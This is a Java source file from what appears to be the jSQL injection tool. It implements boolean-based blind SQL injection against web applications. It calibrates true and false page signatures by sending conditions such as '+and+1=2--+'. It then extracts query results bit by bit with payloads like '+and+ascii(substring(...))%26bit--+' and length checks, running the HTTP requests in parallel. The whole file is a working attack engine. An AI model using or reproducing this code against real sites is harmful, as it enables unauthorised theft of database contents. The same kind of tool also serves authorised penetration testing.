/*******************************************************************************
 * Copyhacked (H) 2012-2013.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model.blind;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.Interruptable;
import com.jsql.model.Stoppable;
import com.jsql.model.bean.Request;
import com.jsql.view.GUIMediator;

/**
 * This module runs injection with method blind, which is defined as the following:
 *     - if SQL query is true: page A is displayed,
 *     - if SQL query is false: page B is displayed,
 * First, test if blind really works on the web server, then process the SQL query
 * one character at a time by using bit checking, the data to parse like SQLihhABCDEFjj31hhiLQS is always expected.
 * Each character is generated one bit at a time, so 8 requests gives 1 character, and one HTTP request gives 0 or 1
 * e.g with string 'SQLi', after 4*8 HTTP requests, 01010011=>S 01010001=>Q 01001100=>L 01101001=>i
 */
public class BlindInjection {
    // Source code of the TRUE web page (usually ?id=1)
    private String blankTrueMark;

    /**
     *  List of string differences found in all the FALSE queries, compared to the TRUE page (aka opcodes).
     *  Each FALSE pages should contain at least one same string, which shouldn't be present in all
     *  the TRUE queries.
     */
    public List<diff_match_patch.Diff> constantFalseMark;

    public BlindInjection(){

        // Call the SQL request which must be TRUE (usually ?id=1)
        blankTrueMark = callUrl("");

        // Every FALSE SQL statements will be checked, more statements means a more robust application
        String[] falseTest = {"true=false","true%21=true","false%21=false","1=2","1%21=1","2%21=2"};

        // Every TRUE SQL statements will be checked, more statements means a more robust application
        String[] trueTest = {"true=true","false=false","true%21=false","1=1","2=2","1%21=2"};

        // Check if the user wants to stop the preparation
        if(GUIMediator.model().stopFlag)return;

        /**
         *  Parallelize the call to the FALSE statements, it will use inject() from the model
         */
        ExecutorService executorFalseMark = Executors.newCachedThreadPool();
        List<BlindCallable> listCallableFalse = new ArrayList<BlindCallable>();
        for (String urlTest: falseTest){
            listCallableFalse.add(new BlindCallable("+and+"+urlTest+"--+"));
        }
        // Begin the url requests
        List<Future<BlindCallable>> listFalseMark;
        try {
            listFalseMark = executorFalseMark.invokeAll(listCallableFalse);
        } catch (InterruptedException e) {
            GUIMediator.model().sendDebugMessage(e);
            return;
        }
        executorFalseMark.shutdown();

        /**
         * Delete junk from the results of FALSE statements, keep only opcodes found in each and every FALSE pages.
         * Allow the user to stop the loop
         */
        try {
            constantFalseMark = listFalseMark.get(0).get().opcodes;
            //            System.out.println(">>>false "+constantFalseMark);
            for(Future<BlindCallable> falseMark: listFalseMark){
                if(GUIMediator.model().stopFlag)return;
                constantFalseMark.retainAll(falseMark.get().opcodes);
            }
        } catch (InterruptedException e) {
            GUIMediator.model().sendDebugMessage(e);
        } catch (ExecutionException e) {
            GUIMediator.model().sendDebugMessage(e);
        }
        //        System.out.println(">>>false-s "+constantFalseMark);

        if(GUIMediator.model().stopFlag)return;

        /**
         *  Parallelize the call to the TRUE statements, it will use inject() from the model
         */
        ExecutorService executorTrueMark = Executors.newCachedThreadPool();
        List<BlindCallable> listCallableTrue = new ArrayList<BlindCallable>();
        for (String urlTest: trueTest){
            listCallableTrue.add(new BlindCallable(/*initialUrl+*/"+and+"+urlTest+"--+"));
        }
        // Begin the url requests
        List<Future<BlindCallable>> listTrueMark;
        try {
            listTrueMark = executorTrueMark.invokeAll(listCallableTrue);
        } catch (InterruptedException e) {
            GUIMediator.model().sendDebugMessage(e);
            return;
        }
        executorTrueMark.shutdown();

        /**
         * Remove TRUE opcodes in the FALSE opcodes, because a significant FALSE statement shouldn't
         * contain any TRUE opcode.
         * Allow the user to stop the loop
         */
        try {
            //            System.out.println(">>>true "+constantTrueMark);
            for(Future<BlindCallable> trueMark: listTrueMark){
                if(GUIMediator.model().stopFlag)return;
                constantFalseMark.removeAll(trueMark.get().opcodes);
            }
        } catch (InterruptedException e) {
            GUIMediator.model().sendDebugMessage(e);
        } catch (ExecutionException e) {
            GUIMediator.model().sendDebugMessage(e);
        }

        //        System.out.println(">>> "+constantFalseMark);
    }

    /**
     * Process the whole blind injection, character by character, bit by bit
     * @param inj SQL query
     * @param interruptable Action a user can stop/pause/resume
     * @param stoppable Action a user can stop
     * @return Final string: SQLiABCDEF...
     * @throws StoppableException
     */
    public String inject(String inj, Interruptable interruptable, Stoppable stoppable) throws StoppableException{
        // Constant linked to a URL, true if that url checks the end of the SQL result, else false
        final boolean IS_LENGTH_TEST = true;

        /**
         *  List of the characters, each one represented by an array of 8 bits
         *  e.g SQLi: bytes[0] => 01010011:S, bytes[1] => 01010001:Q ...
         */
        List<char[]> bytes = new ArrayList<char[]>();
        // Cursor for current character position
        int indexCharacter = 0;

        // Parallelize the URL requests
        ExecutorService taskExecutor = Executors.newCachedThreadPool();
        CompletionService<BlindCallable> taskCompletionService = new ExecutorCompletionService<BlindCallable>(taskExecutor);

        // Send the first binary question: is the SQL result empty?
        taskCompletionService.submit(new BlindCallable("+and+char_length("+inj+")>0--+", IS_LENGTH_TEST));
        // Increment the number of active tasks
        int submittedTasks = 1;

        // Process the job until there is no more active task, in other word until all HTTP requests are done
        while( submittedTasks > 0 ){
            // stop/pause/resume if user needs that
            if(stoppable.shouldStop() || (interruptable != null && interruptable.PAUSEshouldStopPAUSE())){
                taskExecutor.shutdown();

                // Wait for termination
                boolean success = false;
                try {
                    success = taskExecutor.awaitTermination(0, TimeUnit.SECONDS);
                } catch (InterruptedException e) {
                    GUIMediator.model().sendDebugMessage(e);
                }
                if (!success) {
                    // awaitTermination timed out, interrupt everyone
                    taskExecutor.shutdownNow();
                }

                throw new StoppableException();
            }
            try {
                // The URL call is done, bring back the finished task
                BlindCallable currentCallable = taskCompletionService.take().get();
                // One task has just ended, decrease active tasks by 1
                submittedTasks--;
                /**
                 * If SQL result is not empty, then add a new unknown character,
                 * and define a new array of 8 undefined bit.
                 * Then add a new length verification, and all 8 bit requests for that new character
                 */
                if(currentCallable.isLengthTest){
                    if( currentCallable.isTrue() ){
                        indexCharacter++;
                        // New undefined bits of the next character
                        bytes.add(new char[]{'x','x','x','x','x','x','x','x'});
                        // Test if it's the end of the line
                        taskCompletionService.submit(new BlindCallable("+and+char_length("+inj+")>"+indexCharacter+"--+", IS_LENGTH_TEST));
                        // Test the 8 bits for the next character, save its position and current bit for later
                        for(int bit: new int[]{1,2,4,8,16,32,64,128}){
                            taskCompletionService.submit(new BlindCallable("+and+ascii(substring("+inj+","+indexCharacter+",1))%26"+bit+"--+", indexCharacter, bit));
                        }
                        // Add all 9 new tasks
                        submittedTasks += 9;
                    }
                    /**
                     * Process the url that has just checked a bit,
                     * Retrieve the bits for that character, and change the bit from undefined to 0 or 1
                     */
                }else{
                    // The bits linked to the url
                    char[] e = bytes.get(currentCallable.currentIndex-1);
                    // Define the bit
                    e[(int) (8 - ( Math.log(2)+Math.log(currentCallable.currentBit) )/Math.log(2)) ] = currentCallable.isTrue() ? '1' : '0';

                    // Inform the View if a array of bits is complete, else nothing #Need fix
                    try{
                        int charCode = Integer.parseInt(new String(e), 2);
                        String str = new Character((char)charCode).toString();
                        //                        injectionModel.new GUIThread("binary-message","\t"+new String(e)+"="+str).run();

                        Request interaction = new Request();
                        interaction.setMessage("MessageBinary");
                        interaction.setParameters("\t"+new String(e)+"="+str);
                        GUIMediator.model().interact(interaction);
                    }catch(NumberFormatException err){ // byte string not fully constructed : 0x1x010x
                        /* Ignore */
                    }
                }
            } catch (InterruptedException e) {
                GUIMediator.model().sendDebugMessage(e);
            } catch (ExecutionException e) {
                GUIMediator.model().sendDebugMessage(e);
            }
        }

        // End the job
        try {
            taskExecutor.shutdown();
            taskExecutor.awaitTermination(15, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            GUIMediator.model().sendDebugMessage(e);
        }

        // Build the complete final string from array of bits
        String result = "";
        for(char[] c: bytes){
            int charCode = Integer.parseInt(new String(c), 2);
            String str = new Character((char)charCode).toString();
            result += str;
        }
        //        System.out.println("nb caractères: "+indexChar);
        //        System.out.println("résultat: "+result);
        // Return the final string
        return result;
    }

    /**
     * Define a call HTTP to the server, require the associated url, character position and bit.
     * Opcodes represents the differences between the TRUE page, and the resulting page
     */
    private class BlindCallable implements Callable<BlindCallable>{
        // The URL called
        private String blindUrl;
        // Character position
        private int currentIndex;
        // Bit searched
        private int currentBit;

        // Default call used for bit test
        private boolean isLengthTest = false;
        // List of differences found between the TRUE page, and the present page
        private LinkedList<diff_match_patch.Diff> opcodes;

        // Constructor for preparation and blind confirmation
        BlindCallable(String newUrl){
            blindUrl = newUrl;
        }
        // Constructor for bit test
        BlindCallable(String newUrl, int newIndex, int newBit){
            this(newUrl);
            currentIndex = newIndex;
            currentBit = newBit;
        }
        // Constructor for length test
        BlindCallable(String newUrl, boolean newIsLengthTest){
            this(newUrl);
            isLengthTest = newIsLengthTest;
        }

        /**
         * Check if a result page means the SQL query is true,
         * confirm that nothing in the resulting page is also defined in the pages from every FALSE SQL queries,
         * @return true if the current SQL query is true
         */
        public boolean isTrue() {
            for( diff_match_patch.Diff falseDiff: constantFalseMark){
                if(opcodes.contains(falseDiff)){
                    return false;
                }
            }
            return true;
        }

        /**
         * Process the URL HTTP call, use function inject() from the model
         * Build the list of differences found between TRUE and the current page
         */
        @Override
        public BlindCallable call() throws Exception {
            String ctnt = callUrl(blindUrl);
            opcodes = new diff_match_patch().diff_main(blankTrueMark, ctnt, true);
            new diff_match_patch().diff_cleanupEfficiency(opcodes);
            return this;
        }
    }

    // Run a HTTP call via the model
    public String callUrl(String urlString){
        return GUIMediator.model().inject(GUIMediator.model().insertionCharacter + urlString);
    }

    /**
     * Start one test to verify if blind works
     * @return true if blind method is confirmed
     * @throws PreparationException
     */
    public boolean isBlindInjectable() throws PreparationException{
        if(GUIMediator.model().stopFlag)
            throw new PreparationException();

        BlindCallable blindTest = new BlindCallable("+and+0%2b1=1--+");
        try {
            blindTest.call();
        } catch (Exception e) {
            GUIMediator.model().sendDebugMessage(e);
        }

        return constantFalseMark != null && blindTest.isTrue() && constantFalseMark.size() > 0;
    }
}
